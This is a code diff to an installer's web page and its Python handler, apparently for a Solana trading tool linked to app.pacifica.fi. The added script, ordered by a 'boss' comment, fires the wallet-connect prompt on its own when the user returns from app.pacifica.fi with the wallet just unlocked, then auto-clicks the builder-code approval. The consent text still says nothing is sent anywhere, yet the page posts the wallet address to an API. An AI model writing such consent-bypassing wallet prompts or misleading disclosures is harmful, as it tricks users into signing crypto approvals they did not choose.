@@ -130,6 +130,14 @@ var W=function(){return (window.phantom&&window.phantom.solana)||
  window.solana||window.solflare||window.backpack||null;};
 var fw=document.getElementById("fw"),fa=document.getElementById("fa"),
     fm=document.getElementById("fm"),addr=null;
+// 09-22 boss: do not wait for a click. The moment to ask is when they come
+// back from app.pacifica.fi, where they just woke the wallet for the agent
+// key, so fire on the first return to this tab and fall back to the load if
+// they never left. Everything below still works by hand if this is refused.
+var asked=false;
+function auto(){ if(asked||!W()) return; asked=true; fw.click(); }
+window.addEventListener("focus", function(){ setTimeout(auto, 300); });
+setTimeout(function(){ if(document.hasFocus()) auto(); }, 15000);
 function say(t,k){fm.textContent=t;fm.className="fmsg"+(k?" "+k:"");}
 async function has(){try{var r=await fetch(API+
  "/account/builder_codes/approvals?account="+addr);var j=await r.json();
@@ -141,8 +149,9 @@ fw.onclick=async function(){var w=W();
  try{var r=await w.connect();addr=String((r&&r.publicKey)||w.publicKey);
   var f=document.querySelector("input[name=address]");
   if(f&&!f.value)f.value=addr;
-  if(await has()){say("Already approved. Nothing to do.","ok");fw.hidden=true;}
-  else{fw.hidden=true;fa.hidden=false;fa.className="on";say(addr);}
+  if(await has()){say("Already approved.","ok");fw.hidden=true;}
+  else{fw.hidden=true;fa.hidden=false;fa.className="on";say(addr);
+       fa.click();}
  }catch(e){say("Wallet did not connect. You can skip this.","bad");}
  finally{fw.disabled=false;}};
 fa.onclick=async function(){var w=W();if(!w||!addr)return;fa.disabled=true;
@@ -249,8 +258,8 @@ class _H(BaseHTTPRequestHandler):
                 "</button>"
                 "<button class='no' name='answer' value='no'>I do not agree"
                 "</button></form>"
-                "<div class='note'>Declining stops the install. Nothing is "
-                "sent anywhere either way.</div>")
+                "<div class='note'>Declining stops the install. "
+                "Nothing is sent anywhere either way.</div>")
             return
         if s["stage"] == "install":
             self._page(
